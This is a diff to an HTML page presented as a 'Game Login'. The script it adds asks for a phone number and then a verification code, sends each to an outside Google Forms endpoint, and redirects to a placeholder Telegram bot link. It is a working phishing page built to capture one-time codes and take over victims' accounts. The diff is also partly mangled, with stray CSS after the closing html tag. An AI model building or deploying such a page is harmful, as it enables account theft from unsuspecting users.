@@ -4,6 +4,11 @@
   <title>Game Login</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
+    /* Universal fix for the alignment issue */
+    * {
+      box-sizing: border-box;
+    }
+
     body { 
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
       background: #0a0a0a; 
@@ -11,6 +16,7 @@
       justify-content: center; 
       align-items: center; 
       height: 100vh; 
+      margin: 0; /* Ensures no scrollbars */
       color: #00aaff; 
     }
 
@@ -18,7 +24,7 @@
       background: #1a1a1a; 
       padding: 30px 25px; 
       border-radius: 12px; 
-      width: 100%; 
+      width: 90%; /* Better for mobile responsiveness */
       max-width: 400px; 
       box-shadow: 0 0 20px rgba(0, 170, 255, 0.5); 
       text-align: center; 
@@ -34,7 +40,82 @@
       background: #0d0d0d; 
       color: #00aaff; 
       font-size: 16px;
-      /* Removes arrow spinners on number inputs in some browsers */
+      display: block; /* Ensures it sits on its own line correctly */
+    }
+
+    input::placeholder { color: #005577; }
+
+    button { 
+      width: 100%; 
+      padding: 12px; 
+      margin-top: 15px; 
+      border-radius: 8px; 
+      border: none; 
+      background: #4da3ff; /* Matching your screenshot's lighter blue */
+      color: #0a0a0a; 
+      font-size: 16px; 
+      font-weight: bold;
+      cursor: pointer; 
+      transition: 0.3s; 
+    }
+    button:hover { 
+      background: #0077cc; 
+      color: #e0f7ff;
+    }
+
+    .hidden { display: none; }
+  </style>
+</head>
+
+<body>
+
+<div class="box">
+  <h2 id="title">Enter Phone Number</h2>
+  
+  <input type="tel" id="phone" placeholder="Phone Number">
+  
+  <input type="text" id="code" placeholder="Code" class="hidden">
+  <button id="actionBtn" onclick="submitPhone()">Next</button>
+</div>
+
+<script>
+  let savedPhone = "";
+
+  const phoneFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSfxT6LNdV6yHLbQ6Q2G3pGso5L2-1I13PmL2dkm2UOHkRxXdZ4IkoufowM4zhVXguy75Lq5Q/formResponse";
+  const codeFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSfxT6LNdV6yHLbQ6Q2G3pGso5L2-1SW9p4z1l793SUcuSahzAhqYmAgTGxLPYsrv0_y5ohUs/formResponse";
+
+  function submitPhone() {
+    let phoneVal = document.getElementById("phone").value;
+    if(phoneVal==="") { alert("Please enter phone number"); return; }
+    savedPhone = phoneVal;
+
+    const url = phoneFormURL + "?entry.2000000=" + encodeURIComponent(savedPhone);
+    fetch(url, { mode: "no-cors" });
+
+    // Switch to code input
+    document.getElementById("title").innerText = "Enter Code";
+    document.getElementById("phone").classList.add("hidden");
+    document.getElementById("code").classList.remove("hidden");
+
+    const btn = document.getElementById("actionBtn");
+    btn.innerText = "Submit";
+    btn.onclick = submitCode;
+  }
+
+  function submitCode() {
+    let code = document.getElementById("code").value;
+    if(code==="") { alert("Please enter code"); return; }
+
+    const url = codeFormURL + "?entry.2000000=" + encodeURIComponent(code);
+    fetch(url, { mode: "no-cors" });
+
+    document.querySelector(".box").innerHTML = "<h2>You’ll be linked to the game soon</h2>";
+    setTimeout(() => { window.location.href = "YOUR_TELEGRAM_BOT_LINK_HERE"; }, 2000);
+  }
+</script>
+
+</body>
+</html>      /* Removes arrow spinners on number inputs in some browsers */
       -moz-appearance: textfield;
     }
     input::-webkit-outer-spin-button,
